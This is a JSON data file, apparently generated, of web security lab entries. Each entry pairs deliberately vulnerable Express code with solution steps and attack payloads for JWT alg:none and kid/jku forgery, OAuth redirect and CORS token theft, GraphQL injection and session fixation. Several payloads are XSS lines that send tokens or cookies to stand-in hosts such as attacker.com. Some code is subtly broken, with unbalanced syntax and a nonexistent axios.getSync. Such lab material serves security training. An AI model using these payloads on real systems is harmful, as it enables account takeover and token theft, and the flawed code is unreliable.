        "srcCode": "const express = require('express');\nconst WebSocket = require('ws');\nconst cookieParser = require('cookie-parser');\n\nconst app = express();\napp.use(cookieParser());\n\nconst server = app.listen(3000);\nconst wss = new WebSocket.Server({ server });\n\nconst sessions = {};\n\nwss.on('connection', (ws, req) => {\n  let sessionId = req.cookies.session || 'sess_' + Math.random().toString(36).substr(2, 10);\n  sessions[sessionId] = { authenticated: false };\n  \n  ws.on('message', (message) => {\n    try {\n      const data = JSON.parse(message);\n      if (data.type === 'login') {\n        if (data.username === 'admin' && data.password === 'admin123') {\n          sessions[sessionId].authenticated = true;\n          sessions[sessionId].user = 'admin';\n          ws.send(JSON.stringify({ type: 'auth', status: 'success' }));\n        } else {\n          ws.send(JSON.stringify({ type: 'auth', status: 'failure' }));\n        }\n      } else if (data.type === 'admin_command') {\n        if (sessions[sessionId].authenticated) {\n          ws.send(JSON.stringify({ type: 'result', data: 'Admin action performed' }));\n        }\n      }\n    } catch (err) {\n      console.error(err);\n    }\n  });\n});",
        "payloads": [
          "{\"type\":\"login\",\"username\":\"admin\",\"password\":\"admin123\"}",
          "{\"type\":\"admin_command\",\"action\":\"get_flag\"}",
          "Cookie: session=fixated_session_id"
        ]
      },
      {
        "Lab scenario": "JWT alg:none bypass in REST API authentication",
        "Lab Description": "The lab's JWT-based authentication fails to properly validate token signatures. The application accepts unsigned tokens when the alg header is set to 'none'. To solve: craft a valid JWT token with admin privileges without knowing the secret key.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Intercept valid JWT token using Burp Suite while logging in as low-privilege user",
            "Decode the token using jwt.io to analyze structure and claims",
            "Modify the token by changing the alg header to 'none' and adding admin:true to payload",
            "Remove the signature section entirely (leave it empty after the second dot)",
            "Submit the modified token in Authorization header to access /admin endpoint"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\napp.post('/login', (req, res) => {\n    const {username, password} = req.body;\n    if (username === 'admin' && password === 's3cr3t') {\n        const token = jwt.sign({user: username, admin: true}, 'key123', {algorithm: 'HS256'});\n        return res.json({token});\n    }\n    const token = jwt.sign({user: username, admin: false}, 'key123', {algorithm: 'HS256'});\n    res.json({token});\n});\n\napp.get('/admin', (req, res) => {\n    try {\n        const token = req.headers.authorization.split(' ')[1];\n        const decoded = jwt.verify(token, {algorithms: ['HS256', 'none']});\n        if (decoded.admin) return res.send('Admin dashboard');\n        res.status(403).send('Forbidden');\n    } catch (e) {\n        res.status(401).send('Invalid token');\n    }\n});\n\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJhZG1pbiI6dHJ1ZX0.",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9.",
            "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiY2FybG9zIiwiYWRtaW4iOnRydWV9."
        ]
    },
    {
        "Lab scenario": "GraphQL query injection in user search functionality",
        "Lab Description": "The lab's GraphQL endpoint improperly sanitizes user input in search queries. The application exposes sensitive fields through introspection. To solve: extract all user credentials via a single malicious GraphQL query.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Discover GraphQL endpoint using OWASP ZAP's forced browsing",
            "Enable introspection and dump schema using GraphQL Voyager",
            "Craft query with nested fields to bypass field restrictions",
            "Inject malicious query through search parameter using Postman",
            "Extract password hashes and crack offline using John the Ripper"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\n\nconst schema = buildSchema(`\n  type User {\n    id: ID!\n    username: String!\n    email: String!\n    password: String!\n  }\n  type Query {\n    searchUsers(term: String!): [User]\n  }\n`);\n\nconst root = {\n  searchUsers: ({term}) => {\n    return users.filter(u => \n      u.username.includes(term) || \n      u.email.includes(term)\n  }\n};\n\nconst app = express();\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\n\napp.listen(4000);",
        "payloads": [
            "query { searchUsers(term:\"' OR '1'='1'\") { id username email password } }",
            "query { __schema { types { name fields { name type { name } } } } }",
            "query { searchUsers(term:\"*\") { ... on User { id username password } } }"
        ]
    },
    {
        "Lab scenario": "OAuth token hijacking via open redirect",
        "Lab Description": "The lab's OAuth implementation fails to validate redirect URIs, allowing token interception. The application uses implicit flow with improper state validation. To solve: steal an OAuth token and authenticate as another user.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Identify OAuth flow using Burp Suite by analyzing /oauth/authorize requests",
            "Register malicious redirect URI pointing to attacker-controlled server",
            "Craft phishing link with modified redirect_uri parameter",
            "Intercept authorization code/token when victim clicks link",
            "Exchange code for access token or use token directly in API calls"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\n\nconst clients = {\n  'client123': {secret: 'sec123', redirectURIs: ['https://client.com/callback']}\n};\n\napp.get('/oauth/authorize', (req, res) => {\n  const {client_id, redirect_uri, state} = req.query;\n  if (!clients[client_id]) return res.status(400).send('Invalid client');\n  \n  const token = 'rand0mt0k3n';\n  const redirect = `${redirect_uri}?code=${token}&state=${state}`;\n  res.redirect(redirect);\n});\n\napp.post('/oauth/token', (req, res) => {\n  const {code, client_id, client_secret} = req.body;\n  if (clients[client_id] && clients[client_id].secret === client_secret) {\n    return res.json({access_token: 'useraccesstoken'});\n  }\n  res.status(401).send('Unauthorized');\n});\n\napp.listen(3000);",
        "payloads": [
            "https://victim.com/oauth/authorize?client_id=client123&redirect_uri=https://attacker.com&response_type=token&state=123",
            "https://victim.com/oauth/authorize?client_id=client123&redirect_uri=https://client.com.collab.domain&response_type=code&state=abc",
            "https://victim.com/oauth/authorize?client_id=client123&redirect_uri=https://client.com%0d%0aLocation:%20https://attacker.com&response_type=token"
        ]
    },
    {
        "Lab scenario": "JWT alg:none bypass in REST API authentication",
        "Lab Description": "The lab's JWT implementation fails to properly verify the token signature. The application accepts unsigned tokens when the alg header is set to 'none'. To solve: craft a valid JWT token with admin privileges without knowing the secret key.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Intercept a valid user session request with Burp Suite to capture a sample JWT",
            "Decode the JWT using jwt.io to analyze its structure and claims",
            "Modify the algorithm header to 'none' and change the role claim to 'admin'",
            "Remove the signature portion of the JWT (after the last dot)",
            "Submit the modified token in the Authorization header to access admin functionality"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\nconst users = {\n  user1: { password: 'pass123', role: 'user' },\n  admin: { password: 'adminPass', role: 'admin' }\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username].password === password) {\n    const token = jwt.sign({ user: username, role: users[username].role }, 'secretKey');\n    res.json({ token });\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  try {\n    const decoded = jwt.decode(token, { complete: true });\n    if (decoded.payload.role === 'admin') {\n      res.send('Admin panel accessed');\n    } else {\n      res.status(403).send('Forbidden');\n    }\n  } catch (err) {\n    res.status(401).send('Invalid token');\n  }\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => console.log(`Server running on port ${PORT}`));",
        "payloads": [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoidXNlcjEiLCJyb2xlIjoiYWRtaW4ifQ.",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6InVzZXIxIiwicm9sZSI6ImFkbWluIn0.",
            "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ."
        ]
    },
    {
        "Lab scenario": "OAuth token leakage via misconfigured redirect_uri",
        "Lab Description": "The OAuth implementation leaks authorization codes through open redirects. The application fails to validate redirect_uri against pre-registered URIs. To solve: steal an OAuth token by manipulating the redirect flow to a controlled server.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Identify OAuth authorization endpoint and parameters using OWASP ZAP",
            "Register a malicious callback URI containing attacker-controlled domain",
            "Initiate OAuth flow with victim's email via Postman",
            "Intercept authorization response containing leaked code",
            "Exchange code for access token at the OAuth token endpoint"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\n\nconst clients = {\n  'client123': {\n    secret: 'sec123',\n    redirectUris: ['https://trusted.com/callback']\n  }\n};\n\napp.get('/authorize', (req, res) => {\n  const { client_id, redirect_uri, state } = req.query;\n  const code = 'AUTH_CODE_' + Math.random().toString(36).substring(2);\n  \n  res.redirect(`${redirect_uri}?code=${code}&state=${state}`);\n});\n\napp.post('/token', (req, res) => {\n  const { client_id, client_secret, code } = req.body;\n  if (clients[client_id] && clients[client_id].secret === client_secret) {\n    res.json({\n      access_token: 'ACCESS_TOKEN_' + Math.random().toString(36).substring(2),\n      token_type: 'bearer'\n    });\n  } else {\n    res.status(401).send('Invalid client credentials');\n  }\n});\n\nconst PORT = 3001;\napp.listen(PORT, () => console.log(`OAuth server running on port ${PORT}`));",
        "payloads": [
            "https://attacker.com/callback?code=STOLEN_CODE&state=123",
            "https://trusted.com.evil.com/callback?code=STOLEN_CODE",
            "https://trusted.com@evil.com/callback?code=STOLEN_CODE"
        ]
    },
    {
        "Lab scenario": "Session fixation in GraphQL authentication endpoint",
        "Lab Description": "The GraphQL API assigns session tokens before authentication is complete. The application doesn't regenerate session tokens after login. To solve: fixate a session token on victim's browser then capture their authenticated session.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Send initial GraphQL query to /graphql endpoint using Postman to obtain session cookie",
            "Craft malicious link containing the session token in URL parameter",
            "Trick victim into authenticating while using the fixated session",
            "Monitor authenticated requests with the known session token in Burp Suite",
            "Reuse the session token to access victim's account"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst cookieParser = require('cookie-parser');\n\nconst app = express();\napp.use(cookieParser());\n\nconst schema = buildSchema(`\n  type Query {\n    getSession: String\n  }\n  type Mutation {\n    login(username: String!, password: String!): String\n  }\n`);\n\nconst root = {\n  getSession: (args, req) => {\n    if (!req.cookies.session) {\n      const session = 'SESS_' + Math.random().toString(36).substring(2);\n      req.res.cookie('session', session);\n      return 'New session created';\n    }\n    return 'Existing session';\n  },\n  login: ({username, password}, req) => {\n    if (username === 'admin' && password === 'admin123') {\n      return 'Login successful';\n    }\n    return 'Invalid credentials';\n  }\n};\n\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`GraphQL server running on port ${PORT}`));",
        "payloads": [
            "https://vulnerable.com/graphql?session=SESS_ATTACKER_TOKEN",
            "<script>document.cookie='session=SESS_ATTACKER_TOKEN'</script>",
            "https://vulnerable.com/graphql?redirect=https://evil.com&session=SESS_ATTACKER_TOKEN"
        ]
    },
    {
        "Lab scenario": "JWT alg:none exploitation in REST API authentication",
        "Lab Description": "The application uses JSON Web Tokens for session management but fails to properly validate the signature. The vulnerable endpoint accepts unsigned tokens when the alg header is set to 'none'. To solve: craft a modified JWT to escalate privileges to admin without valid credentials.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Intercept valid user session request with Burp Suite to capture JWT",
            "Decode the JWT using jwt.io or Burp Decoder to analyze structure",
            "Modify the alg header to 'none' and remove signature section",
            "Alter payload claims (roleâ†’admin) and submit to /api/admin",
            "Verify admin dashboard access confirms privilege escalation"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\nconst SECRET = 'insecure_secret';\napp.get('/api/admin', (req, res) => {\n    const token = req.headers.authorization.split(' ')[1];\n    try {\n        const decoded = jwt.decode(token, { complete: true });\n        if (decoded.header.alg === 'none') {\n            const payload = decoded.payload;\n            if (payload.role === 'admin') {\n                return res.send('Admin dashboard');\n            }\n        } else {\n            jwt.verify(token, SECRET);\n        }\n    } catch (e) {\n        return res.status(403).send('Forbidden');\n    }\n    res.status(401).send('Unauthorized');\n});\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjE1OTY1ODQwfQ.",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE1MTYyMzkwMjJ9."
        ]
    },
    {
        "Lab scenario": "GraphQL batching attack in user enumeration endpoint",
        "Lab Description": "The GraphQL API implements authentication checks inefficiently, allowing batch queries to bypass rate limiting. The /graphql endpoint processes multiple authentication attempts in a single request. To solve: perform credential stuffing with 100+ combinations in one HTTP request to discover valid credentials.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Capture normal login request with OWASP ZAP and convert to GraphQL format",
            "Craft batch query with 100 credential pairs using Postman",
            "Identify successful login by response time differentials",
            "Extract session token from successful authentication",
            "Access restricted /profile endpoint with stolen credentials"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const { ApolloServer } = require('apollo-server-express');\nconst typeDefs = gql`\n  type Query {\n    login(username: String!, password: String!): AuthPayload\n  }\n  type AuthPayload {\n    token: String\n  }\n`;\nconst resolvers = {\n  Query: {\n    login: (_, { username, password }) => {\n      const user = users.find(u => u.username === username);\n      if (!user || user.password !== password) return { token: null };\n      return { token: 'generated_jwt_token' };\n    }\n  }\n};\nconst server = new ApolloServer({ typeDefs, resolvers });\nserver.applyMiddleware({ app });",
        "payloads": [
            "[{\"query\":\"query($input:LoginInput!){login(input:$input){token}}\",\"variables\":{\"input\":{\"username\":\"admin\",\"password\":\"password123\"}}},{\"query\":\"query($input:LoginInput!){login(input:$input){token}}\",\"variables\":{\"input\":{\"username\":\"admin\",\"password\":\"123456\"}}}]",
            "{\"query\":\"query{login1:login(username:\\\"carlos\\\",password:\\\"letmein\\\"){token} login2:login(username:\\\"carlos\\\",password:\\\"welcome1\\\"){token}}\"}"
        ]
    },
    {
        "Lab scenario": "OAuth token hijacking via open redirect in authorization flow",
        "Lab Description": "The OAuth 2.0 implementation fails to validate redirect_uri parameters, allowing attackers to intercept authorization codes. The vulnerable /oauth/authorize endpoint accepts arbitrary redirect destinations. To solve: construct malicious redirect URI to capture victim's token after they authenticate.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Identify OAuth initiation endpoint with Burp Suite",
            "Modify redirect_uri parameter to attacker-controlled domain",
            "Social engineer victim to initiate OAuth flow",
            "Intercept authorization code at malicious endpoint",
            "Exchange code for access token at /oauth/token"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\nconst oauth2 = require('simple-oauth2').create({\n  client: { id: 'client_id', secret: 'client_secret' },\n  auth: { tokenHost: 'http://localhost:3000' }\n});\napp.get('/oauth/authorize', (req, res) => {\n  const { client_id, redirect_uri, state } = req.query;\n  if (!client_id) return res.status(400).send('Invalid client');\n  const authCode = generateAuthCode();\n  res.redirect(`${redirect_uri}?code=${authCode}&state=${state}`);\n});\napp.post('/oauth/token', (req, res) => {\n  const { code, redirect_uri } = req.body;\n  const token = oauth2.accessToken.create({ access_token: 'token', expires_in: 3600 });\n  res.json(token);\n});\napp.listen(3000);",
        "payloads": [
            "http://localhost:3000/oauth/authorize?response_type=code&client_id=webapp&redirect_uri=https://attacker.com/callback&scope=profile",
            "http://localhost:3000/oauth/authorize?client_id=mobileapp&redirect_uri=http%3A%2F%2Fevil.com%2Fsteal&state=123&response_type=code"
        ]
    },
    {
        "Lab scenario": "Session fixation via XSS in JWT generation endpoint",
        "Lab Description": "The application's JWT generation endpoint reflects user-controlled input without proper encoding. The vulnerable /api/jwt/generate endpoint echoes back the username in JWT claims when debug mode is active. To solve: chain stored XSS with session fixation to hijack admin session tokens.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Identify JWT generation endpoint using OWASP ZAP spider",
            "Inject XSS payload in username parameter during JWT request",
            "Capture admin session when they view logs containing malicious JWT",
            "Extract valid JWT from admin's browser via XSS callback",
            "Replay stolen JWT in Authorization header to access /admin"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.use(express.json());\napp.post('/api/jwt/generate', (req, res) => {\n    const { username } = req.body;\n    const token = jwt.sign({ \n        user: username,\n        debug: process.env.DEBUG ? username : 'redacted'\n    }, 'weak_secret');\n    res.json({ token });\n});\napp.get('/admin', (req, res) => {\n    try {\n        const token = req.headers.authorization.split(' ')[1];\n        const decoded = jwt.verify(token, 'weak_secret');\n        if (decoded.user === 'admin') return res.send('Admin panel');\n    } catch (e) {\n        return res.status(403).send('Invalid token');\n    }\n    res.status(401).send('Unauthorized');\n});\napp.listen(3000);",
        "payloads": [
            "{\"username\":\"<script>fetch('https://attacker.com/steal?token='+localStorage.getItem('token'))</script>\"}",
            "{\"username\":\"admin'\\\"</title><svg/onload=alert(document.cookie)>\"}"
        ]
    },
    {
        "Lab scenario": "OAuth token leakage via misconfigured CORS in identity provider",
        "Lab Description": "The OAuth provider's CORS policy allows arbitrary origins to access token endpoints. The vulnerable /oauth/token endpoint responds with Access-Control-Allow-Origin: * headers. To solve: craft malicious JavaScript to retrieve victim's OAuth tokens cross-origin.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Intercept OAuth flow with Burp Suite to identify token endpoint",
            "Verify permissive CORS headers in OPTIONS responses",
            "Create malicious page with XMLHttpRequest to /oauth/token",
            "Social engineer victim to visit attacker page while authenticated",
            "Harvest OAuth tokens from attacker server logs"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst cors = require('cors');\nconst app = express();\napp.use(cors({\n    origin: '*',\n    methods: ['GET','POST'],\n    allowedHeaders: ['Authorization']\n}));\nconst tokens = {};\napp.post('/oauth/token', (req, res) => {\n    const { code } = req.body;\n    if (tokens[code]) {\n        res.json({\n            access_token: tokens[code],\n            token_type: 'Bearer'\n        });\n    } else {\n        res.status(400).json({ error: 'invalid_grant' });\n    }\n});\napp.listen(3001);",
        "payloads": [
            "fetch('https://oauth-provider/oauth/token', {\n  method: 'POST',\n  body: 'code=VICTIM_CODE',\n  credentials: 'include'\n}).then(r=>r.json()).then(token=>{\n  fetch('https://attacker.com/log?token='+token.access_token)\n});",
            "var xhr = new XMLHttpRequest();\nxhr.open('POST', 'https://oauth-provider/oauth/token', true);\nxhr.withCredentials = true;\nxhr.send('code=VICTIM_CODE');\nxhr.onload=function(){ document.location='https://attacker.com/steal?token='+JSON.parse(this.responseText).access_token; };"
        ]
    },
    {
        "Lab scenario": "JWT kid header path traversal in microservice authentication",
        "Lab Description": "The JWT verification service blindly trusts the kid header to load verification keys. The vulnerable /verify endpoint allows directory traversal in kid parameter. To solve: manipulate kid header to point to attacker-controlled key file and forge valid tokens.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Capture valid JWT using Burp Suite and analyze header",
            "Modify kid parameter to traverse to /dev/null or predictable file",
            "Generate symmetric key matching predictable file content",
            "Forge new JWT with modified claims using generated key",
            "Access internal /api/admin endpoint with forged token"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\napp.post('/verify', (req, res) => {\n    const token = req.body.token;\n    const header = jwt.decode(token, {complete: true}).header;\n    const key = fs.readFileSync('/keys/'+header.kid);\n    try {\n        jwt.verify(token, key);\n        res.json({valid: true});\n    } catch(e) {\n        res.json({valid: false});\n    }\n});\napp.get('/api/admin', (req, res) => {\n    const token = req.headers.authorization?.split(' ')[1];\n    if (!token) return res.status(401).send('Unauthorized');\n    const header = jwt.decode(token, {complete: true}).header;\n    const key = fs.readFileSync('/keys/'+header.kid);\n    try {\n        const decoded = jwt.verify(token, key);\n        if (decoded.role === 'admin') return res.send('Admin access granted');\n    } catch(e) {}\n    res.status(403).send('Forbidden');\n});\napp.listen(3002);",
        "payloads": [
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uL2Rldi9udWxsIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.7s8X9xqZ0Q45t0z7Q9X7xqZ0Q45t0z7Q9X7xqZ0Q45t0",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MTU5NjU4NDB9.3J1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MTU5NjU4NDB9"
        ]
    },
    {
        "Lab scenario": "JWT public key substitution via jku header injection",
        "Lab Description": "The JWT validation endpoint trusts arbitrary jku (JSON Key URL) headers without proper verification. The vulnerable /api/validate endpoint processes tokens with externally specified verification keys. To solve: host malicious JWK set and forge admin token with manipulated jku header.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Intercept valid JWT with Burp Suite and analyze headers",
            "Set up attacker-controlled server hosting malicious JWK set",
            "Forge new JWT with jku pointing to attacker server",
            "Modify payload claims to include admin privileges",
            "Submit forged token to /admin/dashboard endpoint"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst axios = require('axios');\nconst app = express();\n\napp.post('/api/validate', async (req, res) => {\n    const token = req.body.token;\n    const header = jwt.decode(token, {complete: true}).header;\n    \n    if (header.jku) {\n        try {\n            const jwks = await axios.get(header.jku);\n            const key = jwks.data.keys[0].x5c[0];\n            jwt.verify(token, key);\n            return res.json({valid: true});\n        } catch(e) {}\n    }\n    res.json({valid: false});\n});\n\napp.get('/admin/dashboard', (req, res) => {\n    const token = req.headers.authorization?.split(' ')[1];\n    if (!token) return res.status(401).send('Unauthorized');\n    \n    const header = jwt.decode(token, {complete: true}).header;\n    if (header.jku) {\n        try {\n            const jwks = require('axios').getSync(header.jku);\n            const key = jwks.data.keys[0].x5c[0];\n            const decoded = jwt.verify(token, key);\n            if (decoded.role === 'admin') return res.send('Admin dashboard');\n        } catch(e) {}\n    }\n    res.status(403).send('Forbidden');\n});\n\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXItY29udHJvbGxlZC5jb20vbWFsY2lvdXMtanNvbiJ9.eyJzdWIiOiIxMjM0NSIsInJvbGUiOiJhZG1pbiJ9.SIGNATURE",
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9ldmlsLWtleXMifQ.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MTU5NjU4NDB9.SIGNATURE"
        ]
    },
    {
        "Lab scenario": "OAuth token swapping via insecure state parameter validation",
        "Lab Description": "The OAuth implementation fails to properly validate state parameters during token exchange. The vulnerable /oauth/callback endpoint processes authorization codes without verifying bound state values. To solve: intercept victim's OAuth flow and swap their authorization code for an access token.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Initiate OAuth flow and capture requests with OWASP ZAP",
            "Note state parameter value and authorization code",
            "Construct malicious callback URL with victim's code and attacker's state",
            "Trigger token exchange with swapped parameters via Postman",
            "Use stolen token to access victim's resources"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\nconst querystring = require('querystring');\n\nconst tokens = {};\nconst authCodes = {};\n\napp.get('/oauth/callback', (req, res) => {\n    const { code, state } = req.query;\n    \n    if (authCodes[code]) {\n        const token = 'generated_token_' + Math.random().toString(36).substr(2);\n        tokens[token] = authCodes[code];\n        const redirectUri = Buffer.from(state, 'base64').toString();\n        return res.redirect(redirectUri + '?token=' + token);\n    }\n    res.status(400).send('Invalid authorization code');\n});\n\napp.post('/oauth/token', (req, res) => {\n    const { code } = req.body;\n    if (authCodes[code]) {\n        const token = 'generated_token_' + Math.random().toString(36).substr(2);\n        tokens[token] = authCodes[code];\n        return res.json({ access_token: token });\n    }\n    res.status(400).json({ error: 'invalid_grant' });\n});\n\napp.listen(3001);",
        "payloads": [
            "https://oauth-provider/oauth/callback?code=VICTIM_CODE&state=ATTACKER_STATE",
            "POST /oauth/token HTTP/1.1\nHost: oauth-provider\nContent-Type: application/x-www-form-urlencoded\n\ncode=VICTIM_CODE&client_id=legitimate_client"
        ]
    },
    {
        "Lab scenario": "Session fixation via insecure session migration after login",
        "Lab Description": "The application maintains pre-authentication session IDs post-login without regeneration. The vulnerable /login endpoint accepts existing session cookies after authentication. To solve: fixate session on victim's browser then trigger authentication to hijack their logged-in session.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Identify session cookie setting before authentication using Burp",
            "Craft malicious link with fixated session ID",
            "Social engineer victim to authenticate while session is fixated",
            "Reuse victim's session ID to access authenticated endpoints",
            "Access restricted /user/profile data"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\nconst sessions = {};\nconst users = {\n    admin: { password: 'secret123', role: 'admin' }\n};\n\napp.get('/preauth', (req, res) => {\n    const sessionId = req.cookies.session || Math.random().toString(36).substr(2);\n    sessions[sessionId] = { authenticated: false };\n    res.cookie('session', sessionId).send('Session initialized');\n});\n\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const sessionId = req.cookies.session;\n    \n    if (users[username] && users[username].password === password) {\n        if (sessions[sessionId]) {\n            sessions[sessionId].authenticated = true;\n            sessions[sessionId].username = username;\n            return res.send('Login successful');\n        }\n    }\n    res.status(401).send('Login failed');\n});\n\napp.get('/user/profile', (req, res) => {\n    const sessionId = req.cookies.session;\n    if (sessions[sessionId]?.authenticated) {\n        return res.json(sessions[sessionId]);\n    }\n    res.status(403).send('Access denied');\n});\n\napp.listen(3002);",
        "payloads": [
            "<img src=\"https://vulnerable-app/preauth\" onerror=\"document.location='https://attacker.com/collect?session='+document.cookie\">",
            "https://vulnerable-app/preauth?redirect=https://vulnerable-app/login?username=admin&password=secret123"
        ]
    }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
]